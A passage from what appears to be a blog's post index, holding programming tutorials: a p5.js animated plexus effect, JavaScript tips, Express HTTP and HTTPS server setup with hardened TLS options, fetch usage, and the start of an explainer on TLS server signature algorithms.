goal is to build something that looks like this:How we will make it Generate random points all over the screen. Draw lines between points that are close to each other. Closer points will have a brighter coloured line. Move the points slightly each frame. Repeat.Setup p5.jsWe’ll start off by setting up our p5.js project. Boilerplate code for p5.js can be found here on my GitHub. Some custom functions are included in this boilerplate to deal with the inverted y-axis when using browsers. These functions make the coordinate (0,0) draw at the bottom-left instead of the top-left.We’ll only need to modify the script.js file inside the boilerplate code.PointsGenerating PointsOur first step will be to generate a bunch of random points on the screen that will slowly move in a random direction.Let’s start off by creating a Point class:class Point { constructor(backgroundSizeX, backgroundSizeY, moveSpeed, pointSize) { // Store properties this.moveSpeed = moveSpeed; this.pointSize = pointSize; this.backgroundSize = { x: backgroundSizeX, y: backgroundSizeY }; // Generate random starting position this.position = { x: Math.floor(Math.random() * (this.backgroundSize.x - 1)), y: Math.floor(Math.random() * (this.backgroundSize.y - 1)) }; // Generate random starting direction let xDir = Math.random()*2 - 1; let yDir = Math.random()*2 - 1; // Convert to a unit vector let length = Math.sqrt(xDir**2 + yDir**2); this.direction = { x: xDir/length, y: yDir/length }; }}In the setup function of p5.js we’ll now create a bunch of instances of this class. We’ll also need to create an array to store the points, as well as some variables for MOVE_SPEED, POINT_SIZE, and TOTAL_POINTS:const MOVE_SPEED = 0.2;const POINT_SIZE = 5;let TOTAL_POINTS = 300;let SCREEN_WIDTH = 0;let SCREEN_HEIGHT = 0;let POINT_LIST = [];// Initial Setupfunction setup() { SCREEN_WIDTH = window.innerWidth - 20; SCREEN_HEIGHT = window.innerHeight - 20 createCanvas(SCREEN_WIDTH, SCREEN_HEIGHT); // Create random Points all over the screen for (let i = 0; i &amp;lt; TOTAL_POINTS; i++) { POINT_LIST.push(new Point(SCREEN_WIDTH, SCREEN_HEIGHT, MOVE_SPEED, POINT_SIZE)); } frameRate(30);}Drawing PointsNow that we have a list of Point objects, we can draw them to the screen. We’ll do this by adding some code to the draw function that loops over all the points and draws them every frame:// To be called each framefunction draw() { // Draw background &amp;amp; set Rectangle draw mode background(255); rectMode(CENTER); // Draw scene rectangle fill(30,30,30); stroke(30,30,30); drawRect(SCREEN_WIDTH / 2, SCREEN_HEIGHT / 2, SCREEN_WIDTH, SCREEN_HEIGHT) // Draw Points POINT_LIST.forEach(currentPoint =&amp;gt; { drawPoint(currentPoint); });}const drawPoint = (pointObject) =&amp;gt; { stroke(200,200,200); fill(200,200,200); drawCircle(pointObject.position.x, pointObject.position.y, pointObject.pointSize);}If we open the index.html file, we should see the following:LinesDraw Lines to Nearby PointsWe want our points to have lines drawn to other nearby points.At the top of our code let’s add the following constant:const DISTANCE_TO_START_DRAWING_LINES = 150; 2 Points that are further away than this will not have a line between them. NOTE: you may want to adjust this value based on your screen size.For each point we need to find all the other points within this radius and draw a line to them.We’ll add a function called drawLineToNearby which will do this for us. This function will be called every frame before each point is drawn.function draw() { // Draw background &amp;amp; set Rectangle draw mode background(255); rectMode(CENTER); // Draw scene rectangle fill(30,30,30); stroke(30,30,30); drawRect(SCREEN_WIDTH / 2, SCREEN_HEIGHT / 2, SCREEN_WIDTH, SCREEN_HEIGHT) // Draw Lines to Nearby Points POINT_LIST.forEach(currentPoint =&amp;gt; { drawLineToNearby(currentPoint); }); // Draw Points POINT_LIST.forEach(currentPoint =&amp;gt; { drawPoint(currentPoint); });}const drawLineToNearby = (targetPoint) =&amp;gt; { stroke(200,200,200); POINT_LIST.forEach(point =&amp;gt; { let distanceBetween = distanceBetweenPoints(targetPoint, point); // Only draw the line if it&#39;s close enough if (distanceBetween &amp;lt; DISTANCE_TO_START_DRAWING_LINES) { drawLine(targetPoint.position.x, targetPoint.position.y, point.position.x, point.position.y); } })}// Calculate Euclidean distance between 2 pointsconst distanceBetweenPoints = (pointA, pointB) =&amp;gt; { return Math.sqrt(Math.pow(pointA.position.x - pointB.position.x, 2) + Math.pow(pointA.position.y - pointB.position.y, 2));}Here’s what we have so far:Fading Line ColourThis is looking better, but we want the lines that connect points that are closer together to be brighter.We’ll do this by adjusting the Alpha for each line based off the distance. Far away points will be closer to Alpha 0 and nearby points will be closer to Alpha 255.We can achieve this using the map function in p5.js. This function takes 5 arguments and maps an input from one range to another range:map(50, 0, 100, 1, 6) // returns 3.5 50 is halfway between 0 and 100. The output will be the number halfway between 1 and 6, which is 3.5.Here’s the code to implement this in our Plexus:const drawLineToNearby = (targetPoint) =&amp;gt; { POINT_LIST.forEach(point =&amp;gt; { let distanceBetween = distanceBetweenPoints(targetPoint, point); // Only draw the line if it&#39;s close enough if (distanceBetween &amp;lt; DISTANCE_TO_START_DRAWING_LINES) { let alpha = map(distanceBetween, 0, DISTANCE_TO_START_DRAWING_LINES, 255, 0); stroke(200, 200, 200, alpha); drawLine(targetPoint.position.x, targetPoint.position.y, point.position.x, point.position.y); } })}What we have currently:Moving PointsAs a final touch let’s make the points move around the screen slowly.We’ll do this by adding an update function to our Point class that will be called every frame. This will change the points position over time.class Point { constructor(backgroundSizeX, backgroundSizeY, moveSpeed, pointSize) { // Store properties this.moveSpeed = moveSpeed; this.pointSize = pointSize; this.backgroundSize = { x: backgroundSizeX, y: backgroundSizeY }; // Generate random starting position this.position = { x: Math.floor(Math.random() * (this.backgroundSize.x - 1)), y: Math.floor(Math.random() * (this.backgroundSize.y - 1)) }; // Generate random starting direction let xDir = Math.random()*2 - 1; let yDir = Math.random()*2 - 1; // Convert to a unit vector let length = Math.sqrt(xDir**2 + yDir**2); this.direction = { x: xDir/length, y: yDir/length }; } update() { // Update the position of the object this.position.x += this.direction.x * this.moveSpeed; this.position.y += this.direction.y * this.moveSpeed; // Handle going off the left &amp;amp; right sides of the screen if (this.position.x &amp;lt; 1) this.direction.x = Math.abs(this.direction.x); else if (this.position.x &amp;gt; this.backgroundSize.x-2) this.direction.x = -Math.abs(this.direction.x); // Handle going off the top and bottom sides of the screen if (this.position.y &amp;lt; 1) this.direction.y = Math.abs(this.direction.y); else if (this.position.y &amp;gt; this.backgroundSize.y-2) this.direction.y = -Math.abs(this.direction.y); }}We’ll call this update function every frame after we have drawn all the points:function draw() { // Draw background &amp;amp; set Rectangle draw mode background(255); rectMode(CENTER); // Draw scene rectangle fill(30,30,30); stroke(30,30,30); drawRect(SCREEN_WIDTH / 2, SCREEN_HEIGHT / 2, SCREEN_WIDTH, SCREEN_HEIGHT) // Draw Lines to Nearby Points POINT_LIST.forEach(currentPoint =&amp;gt; { drawLineToNearby(currentPoint); }); // Draw Points &amp;amp; Update their positions POINT_LIST.forEach(currentPoint =&amp;gt; { drawPoint(currentPoint); currentPoint.update(); });}Conclusion We now have an animated 2D plexus effect! I encourage you to play around with the MOVE_SPEED, POINT_SIZE, DISTANCE_TO_START_DRAWING_LINES and TOTAL_POINTS variables as well as the drawLineToNearby function to see what you like best.More IdeasColour Change Demo available here This effect is done by changing the colour hue based off the x-coordinate using the map function. Full code below.Horizontal Only Demo available hereVertical OnlyExample 1 Demo available hereExample 2Horizontal &amp;amp; Vertical Demo available hereFull Codeconst MOVE_SPEED = 0.2;const POINT_SIZE = 5;const DISTANCE_TO_START_DRAWING_LINES = 150;let TOTAL_POINTS = 300;let SCREEN_WIDTH = 0;let SCREEN_HEIGHT = 0;let POINT_LIST = [];// Drawing functions to handled inverted Y-Axis of the browserconst drawRect = (x, y, w, h) =&amp;gt; rect(x, SCREEN_HEIGHT-y, w, h);const drawLine = (x1, y1, x2, y2) =&amp;gt; line(x1, SCREEN_HEIGHT-y1, x2, SCREEN_HEIGHT-y2);const drawCircle = (x, y, d) =&amp;gt; circle(x, SCREEN_HEIGHT-y, d);const drawArc = (x, y, w, h, startAngle, stopAngle) =&amp;gt; arc(x, SCREEN_HEIGHT-y, w, h, 2*Math.PI-stopAngle, 2*Math.PI-startAngle);const drawTri = (x1, y1, x2, y2, x3, y3) =&amp;gt; triangle(x1, SCREEN_HEIGHT-y1, x2, SCREEN_HEIGHT-y2, x3, SCREEN_HEIGHT-y3);// Initial Setupfunction setup() { SCREEN_WIDTH = window.innerWidth - 20; SCREEN_HEIGHT = window.innerHeight - 20 createCanvas(SCREEN_WIDTH, SCREEN_HEIGHT); // Create random Points all over the screen for (let i = 0; i &amp;lt; TOTAL_POINTS; i++) { POINT_LIST.push(new Point(SCREEN_WIDTH, SCREEN_HEIGHT, MOVE_SPEED, POINT_SIZE)); } frameRate(30);}function draw() { // Draw background &amp;amp; set Rectangle draw mode background(255); rectMode(CENTER); // Draw scene rectangle fill(30,30,30); stroke(30,30,30); drawRect(SCREEN_WIDTH / 2, SCREEN_HEIGHT / 2, SCREEN_WIDTH, SCREEN_HEIGHT) // Draw Lines to Nearby Points POINT_LIST.forEach(currentPoint =&amp;gt; { drawLineToNearby(currentPoint); }); // Draw Points &amp;amp; Update their positions POINT_LIST.forEach(currentPoint =&amp;gt; { drawPoint(currentPoint); currentPoint.update(); });}const drawPoint = (pointObject) =&amp;gt; { stroke(200,200,200); fill(200,200,200); drawCircle(pointObject.position.x, pointObject.position.y, pointObject.pointSize);}const drawLineToNearby = (targetPoint) =&amp;gt; { colorMode(HSB, 360, 100, 100, 100); POINT_LIST.forEach(point =&amp;gt; { let distanceBetween = distanceBetweenPoints(targetPoint, point); // Only draw the line if it&#39;s close enough if (distanceBetween &amp;lt; DISTANCE_TO_START_DRAWING_LINES) { let colour = map(targetPoint.position.x, 0, targetPoint.backgroundSize.x, 0, 300); let brightness = map(distanceBetween, 0, DISTANCE_TO_START_DRAWING_LINES, 100, 0); stroke(colour, 100, 100, brightness); drawLine(targetPoint.position.x, targetPoint.position.y, point.position.x, point.position.y); } }) colorMode(RGB, 255);}// Calculate Euclidean distance between 2 pointsconst distanceBetweenPoints = (pointA, pointB) =&amp;gt; { return Math.sqrt(Math.pow(pointA.position.x - pointB.position.x, 2) + Math.pow(pointA.position.y - pointB.position.y, 2));}class Point { constructor(backgroundSizeX, backgroundSizeY, moveSpeed, pointSize) { // Store properties this.moveSpeed = moveSpeed; this.pointSize = pointSize; this.backgroundSize = { x: backgroundSizeX, y: backgroundSizeY }; // Generate random starting position this.position = { x: Math.floor(Math.random() * (this.backgroundSize.x - 1)), y: Math.floor(Math.random() * (this.backgroundSize.y - 1)) }; // Generate random starting direction let xDir = Math.random()*2 - 1; let yDir = Math.random()*2 - 1; // Convert to a unit vector let length = Math.sqrt(xDir**2 + yDir**2); this.direction = { x: xDir/length, y: yDir/length }; } update() { // Update the position of the object this.position.x += this.direction.x * this.moveSpeed; this.position.y += this.direction.y * this.moveSpeed; // Handle going off the left &amp;amp; right sides of the screen if (this.position.x &amp;lt; 1) this.direction.x = Math.abs(this.direction.x); else if (this.position.x &amp;gt; this.backgroundSize.x-2) this.direction.x = -Math.abs(this.direction.x); // Handle going off the top and bottom sides of the screen if (this.position.y &amp;lt; 1) this.direction.y = Math.abs(this.direction.y); else if (this.position.y &amp;gt; this.backgroundSize.y-2) this.direction.y = -Math.abs(this.direction.y); }}" }, { "title": "JavaScript Tips &amp; Tricks", "url": "/posts/javascript-tips-and-tricks/", "categories": "javascript, programming", "tags": "javascript, nodejs", "date": "2021-04-15 18:32:40 +1100", "snippet": "In this post we’ll look at some useful tip and tricks when using JavaScript. Remove Empty/False Array Elements JSON Templating Sorting an Array of Objects Destructing Spreading Combining Arrays Combining Objects Function Arguments Create &amp;amp; Submit HTML FormRemove Empty/False Array Elementslet myArray = [&#39;alex&#39;, &#39;&#39;, &#39;&#39;, &#39;wells&#39;, &#39;&#39;];myArray.filter(x =&amp;gt; x); // [&#39;alex&#39;, &#39;wells&#39;]let myArray = [&#39;alex&#39;, &#39;&#39;, null, 0, 1, undefined, false, true, [], {}];myArray.filter(x =&amp;gt; x); // [&#39;alex&#39;, 1, true, [], {}]JSON Templatinglet key = &#39;city&#39;;let value = &#39;Melbourne&#39;;let obj = { [key]: value};console.log(obj); // { city: &#39;Melbourne&#39; }Remove Duplicates from an ArrayMethod 1let myArray = [1,2,4,7,2,3,7,4,7,5,3,2,1,1,5,7,8,8,5,3,3,1,6,0,4,0,5,3,1];let cleanedArray = [...new Set(myArray)];console.log(cleanedArray); // [ 1, 2, 4, 7, 3, 5, 8, 6, 0 ]Method 2 Array elements will be casted to strings. More code. Better if the Object used to remove duplicates is also required.const removeDuplicates = (arr) =&amp;gt; { let elements = {}; arr.forEach(element =&amp;gt; { elements[element] = true; }); return Object.keys(elements);}let myArray = [1,2,4,7,2,3,7,4,7,5,3,2,1,1,5,7,8,8,5,3,3,1,6,0,4,0,5,3,1];removeDuplicates(myArray); // [&#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;]Sorting an Array of Objects// Sort an Array of Objects by a certain keyconst sortArrayByKey = (array, keyToSortBy, reverse=false) =&amp;gt; { if (reverse) { // Sort the array in reverse order (Highest to Lowest) array.sort((a,b) =&amp;gt; a[keyToSortBy] &amp;gt; b[keyToSortBy] ? -1 : 1); } else { // Sort the array in normal order (Lowest to Highest) array.sort((a,b) =&amp;gt; a[keyToSortBy] &amp;gt; b[keyToSortBy] ? 1 : -1); }}Destructingconst myFunction = ({name, city, country}) =&amp;gt; { console.log(name, city, country);}let obj = { name: &#39;Alex&#39;, city: &#39;Melbourne&#39;, country: &#39;Australia&#39; };myFunction(obj); // Alex Melbourne Australiaconst myFunction = (data) =&amp;gt; { let { name, city, country } = data; console.log(name, city, country);}let obj = { name: &#39;Alex&#39;, city: &#39;Melbourne&#39;, country: &#39;Australia&#39; };myFunction(obj); // Alex Melbourne AustraliaSpreadingCombining Arrayslet arrayA = [4, 5, 6];let arrayB = [1, 2, 3, ...arrayA]; arrayB // [1, 2, 3, 4, 5, 6]Combining Objectslet objA = { name: &#39;Alex&#39;, city: &#39;Sydney&#39; };let objB = { ...objA, city: &#39;Melbourne&#39;, country: &#39;Australia&#39; };let objC = { city: &#39;Melbourne&#39;, country: &#39;Australia&#39;, ...objA };console.log(objB); // { name: &#39;Alex&#39;, city: &#39;Melbourne&#39;, country: &#39;Australia&#39; }console.log(objC); // { name: &#39;Alex&#39;, city: &#39;Sydney&#39;, country: &#39;Australia&#39; }Function Argumentslet args = [10, 30, -5, 0, 100];console.log(Math.min(args)); // NaNconsole.log(Math.min(...args)); // -5const myFunction = (a,b,c) =&amp;gt; { console.log(a,b,c);}let args = [10, 20, 30];myFunction(args) // [10, 20, 30] undefined undefinedmyFunction(...args); // 10 20 30const myFunction = (a, b, ...c) =&amp;gt; { console.log(a,b,c);}myFunction(10, 20, 30, 40, 50) // 10 20 [30, 40, 50]myFunction(10, 20) // 10 20 []myFunction(10) // 10 undefined []Create &amp;amp; Submit HTML Formconst createAndSubmitForm = () =&amp;gt; { let form = document.createElement(&#39;form&#39;); let formParameter1 = document.createElement(&#39;input&#39;); form.method = &#39;POST&#39;; form.action = &#39;/endpoint&#39;; formParameter1.name=&#39;username&#39;; formParameter1.value=&#39;admin&#39;; form.appendChild(formParameter1); document.body.appendChild(form); form.submit();}createAndSubmitForm();" }, { "title": "NodeJS Express HTTPS Server", "url": "/posts/express-https-server/", "categories": "javascript, nodejs", "tags": "javascript, web, https, http, nodejs, server, express", "date": "2021-04-10 13:30:07 +1100", "snippet": "In this post we’ll look at how to add TLS to an NodeJS express HTTP server.This post will assume that you already know how to setup a HTTP server using express. If you don’t know how to, you can learn how to do it here. Server Options Creating the Server Hardened TLS Configuration Hardened Configuration Example Server OptionsTo add TLS to our server we first need to define an object containing some options:const serverOptions = { // Certificate(s) &amp;amp; Key(s) cert: fs.readFileSync(path.join(__dirname, &#39;certs/host.crt&#39;)), key: fs.readFileSync(path.join(__dirname, &#39;certs/host.key&#39;)), // Optional: TLS Versions maxVersion: &#39;TLSv1.3&#39;, minVersion: &#39;TLSv1.2&#39;}Creating the ServerWe only need to modify one other line of code to enable TLS:const server = require(&#39;https&#39;).Server(serverOptions, app);The entire code for a simple HTTPS server looks like this:const express = require(&#39;express&#39;);const path = require(&#39;path&#39;);const fs = require(&#39;fs&#39;);const app = express();const PORT = 4443;const serverOptions = { // Certificate(s) &amp;amp; Key(s) cert: fs.readFileSync(path.join(__dirname, &#39;certs/host.crt&#39;)), key: fs.readFileSync(path.join(__dirname, &#39;certs/host.key&#39;)), // TLS Versions maxVersion: &#39;TLSv1.3&#39;, minVersion: &#39;TLSv1.2&#39;}const server = require(&#39;https&#39;).Server(serverOptions, app);app.get(&#39;/&#39;, (req, res) =&amp;gt; { res.sendFile(path.join(__dirname, &#39;index.html&#39;));});// Start the Serverserver.listen(PORT, () =&amp;gt; { console.log(`[-] Server Listening on Port ${PORT}`);});Hardened TLS ConfigurationFor a more secure TLS configuration you should do the following: Disable all older/legacy versions of TLS. Use minVersion and maxVersion to specify the supported TLS versions. Disable all insecure &amp;amp; old cipher suites. Use ciphers to specify which cipher suites should be supported. Disable all but the most secure Elliptic Curves for the key exchange. Use ecdhCurve to specify which curves should be supported for the Key Exchange. Disable all signature algorithms that don’t use strong hash functions. Use sigalgs to specify which Server Signature Algorithms should be supported. NOTE Supported Signature Algorithms will vary depending on the type of certificate you are using! Learn more about Server Signature algorithms here. Hardened Configuration Exampleconst serverOptions = { // Certificate(s) &amp;amp; Key(s) cert: fs.readFileSync(path.join(__dirname, &#39;certs/host.crt&#39;)), key: fs.readFileSync(path.join(__dirname, &#39;certs/host.key&#39;)), // TLS Versions maxVersion: &#39;TLSv1.3&#39;, minVersion: &#39;TLSv1.3&#39;, // Hardened configuration ciphers: &#39;TLS_AES_256_GCM_SHA384:TLS_AES_128_GCM_SHA256&#39;, ecdhCurve: &#39;P-521:P-384&#39;, sigalgs: &#39;ecdsa_secp384r1_sha384&#39;, // Attempt to use server cipher suite preference instead of clients honorCipherOrder: true}" }, { "title": "NodeJS Express HTTP Server", "url": "/posts/express-http-server/", "categories": "javascript, nodejs", "tags": "javascript, web, http, nodejs, server, express", "date": "2021-04-09 18:32:40 +1100", "snippet": "In this post we’ll look at how to build a simple HTTP server in NodeJS using the express framework. Server Setup Required Packages Basic Setup Express Basics Routes Sending Back Data Response Codes Route Parameters Query Parameters Cookies JSON Body More Advanced Stuff Custom Headers Next Route Server SetupRequired PackagesFirst step is to install the required npm packages:npm i express body-parserBasic SetupOnce the packages are installed, we can use the below code to import the packages and setup our first server:const path = require(&#39;path&#39;);const express = require(&#39;express&#39;);const bodyParser = require(&#39;body-parser&#39;);// Create new Express Serverconst app = express();const server = require(&#39;http&#39;).Server(app);// Server Configurationconst PORT = 8080;// Support JSON encoded POST request bodiesapp.use(bodyParser.json());// Start the Serverserver.listen(PORT, () =&amp;gt; { console.log(`[-] Server Listening on Port ${PORT}`);});Nice, our server is now setup! But it’s not very useful as it doesn’t actually do anything. Let’s learn how to setup routes/endpoints so we can listen for request and send back data.Express BasicsRoutesHere is how we create a basic route: The first parameter is a string containing the route path (endpoint). The second parameter is a callback that will be executed when a request is made to the route.// GET Exampleapp.get(&#39;/&#39;, (req, res) =&amp;gt; { res.send(&#39;GET Hello!&#39;);});// POST Exampleapp.post(&#39;/&#39;, (req, res) =&amp;gt; { res.send(&#39;POST Hello!&#39;);});The functions names get &amp;amp; post can be changed to any valid HTTP method (OPTIONS, PUT, DELETE, etc) in lowercase.Sending Back DataWhen the callback function is executed, two parameters will be passed in for us to use. These are the req and res parameters short for request and response: req contains information about the request such as headers and any data in the body that may have been sent. res is how we send data back to the client, using the the send and sendFile methods.// The type will automatically be set as HTML if a string is provided.app.get(&#39;/home&#39;, (req, res) =&amp;gt; { res.send(&#39;&amp;lt;h1&amp;gt;Home&amp;lt;/h1&amp;gt;&#39;);});// The content-type will automatically be set as JSON if an object is provided.app.get(&#39;/json&#39;, (req, res) =&amp;gt; { res.send({ json: true });});// You can also specify the type manuallyapp.get(&#39;/text&#39;, (req, res) =&amp;gt; { res.type(&#39;txt&#39;); res.send(&#39;&amp;lt;h1&amp;gt;Home&amp;lt;/h1&amp;gt;&#39;);});// Return a file from diskapp.get(&#39;/home&#39;, (req, res) =&amp;gt; { res.sendFile(path.join(__dirname, &#39;index.html&#39;));});Response CodesWhen data is sent back using the send or sendFile methods a response code of 200 is used. We can specify a custom code using the status and sendStatus methods: If you want to change the status code AND send data back in the body, use the status method. If you only want to send a status code with no body, use the sendStatus method.app.get(&#39;/json&#39;, (req, res) =&amp;gt; { // Send custom HTTP Status code res.status(406).send({ json: true });});app.get(&#39;/admin&#39;, (req, res) =&amp;gt; { // Send custom HTTP Status code res.sendStatus(404);});Route ParametersWe use Route Parameters as a placeholder variable for data that will be supplied by the user: If the client calls the API /user/53, we want to be able to access the value 53. We can do this by specifying a Route Parameter like this /user/:userId. Route parameters are accessible using req.params. This returns an object of all the route parameters. Using req.params.userId will return 53.// Route with a Route Parameterapp.get(&#39;/user/:userId&#39;, (req, res) =&amp;gt; { // For the URI: /user/53 console.log(req.params); // { userId: &#39;53&#39; }; console.log(req.params.userId) // &#39;53&#39; res.sendStatus(200);});// Multiple Route Parametersapp.get(&#39;/light/:lightbulbId/:action&#39;, (req, res) =&amp;gt; { // For the URI: /light/17/off console.log(req.params); // { lightbulbId: &#39;17&#39;, action: &#39;off&#39; }; console.log(`Light ${req.params.lightbulbId} will be turned ${req.params.action}`) // &#39;Light 17 will be turned off&#39; res.sendStatus(200);});Query ParametersQuery Parameters can be supplied by the client can be accessed using req.query. An object containing all the query parameters will be returned:// Query Parameters Exampleapp.get(&#39;/search&#39;, (req, res) =&amp;gt; { // For the URI: /search?firstName=John&amp;amp;lastName=Smith console.log(req.query) // { firstName: &#39;John&#39;, lastName: &#39;Smith&#39; } // Send custom HTTP Status code res.sendStatus(200);});CookiesWe can set a cookie in the response by using the cookie method: The first parameters is the cookie name MyCookie. The second is the cookie value abcdefghijklmnopqrstuvwxyz. The third is an object of cookie attributes.After using the cookie method, either send or sendStatus must be called as well to return the result.app.get(&#39;/home&#39;, (req, res) =&amp;gt; { res.cookie(&#39;MyCookie&#39;, &#39;abcdefghijklmnopqrstuvwxyz&#39;, { maxAge: 3600000, // Time in milliseconds: 3600000 = 1 Hour domain: &#39;localhost&#39;, path: &#39;/&#39;, secure: false, httpOnly: true, sameSite: &#39;strict&#39; }).send({ success: true });});Multiple cookies can be set by calling the cookie method multiple times.JSON BodyIf the client has sent us data in JSON format, here is how we can access that data from the request: req.body will return the JSON data in the request body in the form of an object. NOTE 1: if req.body is undefined, ensure that you have app.use(bodyParser.json()); in your code. NOTE 2: if req.body is an empty object, ensure that the Content-Type in the request header is application/json.// Login APIapp.post(&#39;/login&#39;, (req, res) =&amp;gt; { console.log(req.body); // { username: &#39;John123&#39;, password: &#39;Password_ThatShouldNotBeGuessed641&#39;} console.log(req.body.username); // &#39;John123&#39; console.log(req.body.password); // &#39;Password_ThatShouldNotBeGuessed641&#39; let loginSuccessful = false; if (req.body &amp;amp;&amp;amp; req.body.username &amp;amp;&amp;amp; req.body.password) { // Insert Authentication logic here loginSuccessful = checkLogin(req.body.username, req.body.password) } if (loginSuccessful) { // Login Successful, set a Cookie in the response res.cookie(&#39;auth-token&#39;, &#39;kln450x02sl5gusnh3mpu0s7ca2jfsaf8h&#39;, { maxAge: 3600000, // Time in milliseconds: 3600000 = 1 Hour httpOnly: true, sameSite: &#39;lax&#39; }).send({ success: true }); } else { // Login Failed res.send({ success: false }); }});More Advanced StuffCustom HeadersCustom response headers can be added using the header method to add controls such as CORS, HSTS, CSP, etc: The first parameter is the header name. The second parameter is the header value.app.get(&#39;/home&#39;, (req, res) =&amp;gt; { res.header(&#39;Access-Control-Allow-Origin&#39;, &#39;http://127.0.0.1:8080&#39;); res.sendFile(path.join(__dirname, &#39;index.html&#39;));});Next RouteA common situation that can occur is when you need to do the same thing in multiple routes. An example of this might be adding a header, or checking if a user is authenticated.Adding these headers/checks in every route is bad practice and can lead to security issues if you forget to add it in one of routes.Luckily there is a better way:// Route 1app.use((req, res, next) =&amp;gt; { res.header(&#39;Custom-Header&#39;, &#39;NodeJS Server&#39;); next();})// Route 2app.get(&#39;/home&#39;, (req, res) =&amp;gt; { res.sendFile(path.join(__dirname, &#39;index.html&#39;));});// Route 3app.use((req, res, next) =&amp;gt; { // Insert logic to check if the user&#39;s cookie is valid let authed = true; if (authed) { next(); } else { res.sendStatus(404); }})// Route 4app.get(&#39;/authed/home&#39;, (req, res) =&amp;gt; { res.sendFile(path.join(__dirname, &#39;home.html&#39;));});The use function matches every route, so putting a app.use before all other routes will ensure it gets called first.When we request /home the following will happen: Route 1 is be matched, custom response header is be added, and the next function is called. The next function means the route is finished doing what it needs to, but it doesn’t want to send a response. Express will continue checking for the next route that matches. Route 2 is matched and returns index.html, completing the request.When we request /authed/home the following will happen: Route 1 is be matched, custom response header is be added, and the next function is called. Route 2 is NOT matched. Route 3 is matched. This route checks to see if the user authorized to view the subsequent pages. If yes, then next is called. If not, then a 404 is sent to the client. If the user is authorised, then Route 4 is matched and returns home.html, completing the request." }, { "title": "JavaScript Fetch", "url": "/posts/javascript-fetch/", "categories": "javascript", "tags": "javascript, web, http, https", "date": "2021-04-09 18:32:40 +1100", "snippet": "In this post we’ll look at how to use the fetch command in JavaScript in the browser with some common use cases and examples. Making Requests GET Request POST Request Include Cookies for Cross-Domain Requests Custom Headers Response Data Accessing Response Data Response Headers &amp;amp; Status Making RequestsGET Requestfetch(&#39;/home&#39;);POST Request// The JSON data that will be sent in our POST requestlet apiData = { username: &#39;username&#39;, password: &#39;password&#39; };fetch(&#39;/login&#39;, { method:&#39;POST&#39;, headers: { &#39;Content-Type&#39;: &#39;application/json&#39; }, body: JSON.stringify(apiData)});Include Cookies for Cross-Domain Requests// The current origin is &quot;https://my-domain.com&quot;.// Cookies for &quot;my-domain.com&quot; will be sent in the request.fetch(&#39;/home&#39;);// Cookies for &quot;testing.com&quot; WILL NOT be sent in the request.fetch(&#39;https://testing.com/home&#39;);// Cookies for &quot;testing.com&quot; WILL be sent in the request (assuming the SameSite attribute permits it).fetch(&#39;https://testing.com/home&#39;, { credentials: &#39;include&#39;});Custom Headersfetch(&#39;/home&#39;, { headers: { &#39;Custom-Header-1&#39;: &#39;My Custom Header 1&#39;, &#39;Custom-Header-2&#39;: &#39;My Custom Header 2&#39;, &#39;Authorization&#39;: &#39; Bearer myToken&#39;, },});Response DataAccessing Response DataUsing then/catch/finallyfetch(&#39;/api/v1/user&#39;).then(response =&amp;gt; response.json() // .text() is valid if you want the data as a string instead.).then(data =&amp;gt; { console.log(data); // { userId: 1, username: &quot;admin&quot; }}).catch(err =&amp;gt; { console.error(err);});Using Async &amp;amp; Awaitlet responseData = await fetch(&#39;/api/v1/user&#39;);responseData = await responseData.json();console.log(responseData); // { userId: 1, username: &quot;admin&quot; }Response Headers &amp;amp; Statuslet response = await fetch(&#39;/api/v1/user&#39;);// Get the HTTP response codeconsole.log(response.status);// Get a single headerconsole.log(response.headers.get(&#39;content-type&#39;));// Loop over all headers &amp;amp; valuesresponse.headers.forEach((value, header) =&amp;gt; { console.log(header, value);}); Set-Cookie header will NOT be accessible. It’s removed by the browser for security." }, { "title": "TLS Server Signature Algorithm", "url": "/posts/tls-server-signature-algorithm/", "categories": "security, certificates", "tags": "tls, security, certificate, openssl, host, cryptography, https, signature, algorithm", "date": "2021-04-08 18:30:12 +1100", "snippet": "In this post we’ll look at what the TLS Server Signature Algorithm is for.This guide can get technical at times so it’s recommended that you understand the follow terms as they are assumed knowledge: RSA (Rivest–Shamir–Adleman) ECC (Elliptic-Curve-Cryptography) Symmetric Cryptography (i.e. AES) Asymmetric Cryptography (Public/Private Key pair) DH &amp;amp; ECDH (Diffie-Hellman &amp;amp; Elliptic-Curve Diffie-Hellman) Hash Function (i.e. SHA1, SHA256, SHA512) CA (Certificate Authority) Host Certificate (Certificate used for a web-server)Contents SSLScan Results SSL Certificate Section Breakdown What are Server Signature Algorithms? Server Signature Algorithm Breakdown Edge Case 1 SSLScan False Positives Verifying False Positives Edge Case 2 Dual Certificates How does this make sense? ConclusionSSLScan ResultsBelow we have the Server Signature Algorithm(s) and SSL Certificate sections from a SSLScan of a web server:SSL Certificate Section BreakdownThe Signature Algorithm: sha384WithRSAEncryption line indicates that the Private Key used to sign this Host Certificate is an RSA key, and the hash function used for the integrity check is SHA384. This line DOES NOT tell us anything about the Host Certificate, only what was used to sign it (i.e. the CA).The line RSA Key Strength: 4096 tells us what type of algorithm was used to create the Host Certificate Keys. In this case it was RSA with a 4096-bit key. This is important because we now know that the Private Key for this Host Certificate is an RSA key, rather than an ECC key.What are Server Signature Algorithms used for?When using TLS, messages sent by the client and server are encrypted using symmetric keys. To do this the client and server both need to be able to calculate the same symmetric keys. This is achieved by exchanging Public keys (using DH or ECDH) during the TLS connection setup. These Public keys are NOT the same as the Host Certificate Public key, these keys are ephemeral (temporary) and are randomly generated at the start of each new connection to provide Perfect Forward Secrecy.During the connection setup phase, the server must generate a Public/Private key pair and send the Public key to the client. However, since this Public key has just been generated, it’s not safe to sent to the client as is. This is because the client has no proof that the key was generated by the server. To solve this the server hashes and signs this new ephemeral Public key using the Private key of the Host Certificate.Below is a diagram of how the signing and verification works. The ephemeral Public key as well as some other information sent during the TLS connection setup is the input data for the Hash Function. The resulting hash is then encrypted using the Private key of the Host Certificate to produce a signature (left diagram). The ephemeral Public key and the signature are then sent to the client. The client can verify that that ephemeral Public key is from the server by checking the signature. The signature verification can be done using the Host Certificate Public key (right diagram).We can now ready to understand the Server Signature Algorithm(s) section of the SSLScan. The algorithms listed are the algorithms that the server supports for signing the ephemeral Public Key in the process that was explained above.Server Signature Algorithm BreakdownBelow we have the same scan results as above just with one of the algorithms highlighted. Let’s break down what the highlight algorithm means.rsa_pkcs1_sha256 means that the ephemeral Public key will be encrypted using RSA. PKCS1 indicates the standard that is being used. SHA256 is the hashing 